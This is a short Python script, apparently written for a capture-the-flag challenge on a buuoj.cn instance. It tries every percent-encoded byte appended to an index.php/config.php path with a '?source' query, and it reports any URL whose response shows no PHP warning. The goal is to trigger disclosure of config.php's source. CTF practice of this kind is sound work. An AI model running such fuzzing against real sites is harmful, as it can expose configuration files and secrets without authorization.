import requests

for x in range(256):
    url = "http://c88a5437-82b3-44e3-8206-c859ecf07e48.node3.buuoj.cn/index.php/config.php/{}?source".format("%"+str(hex(x)[2:]))
    
    r = requests.get(url=url)
    if "Warning" not in r.text:
        print("the result is ",url)
        # exit()



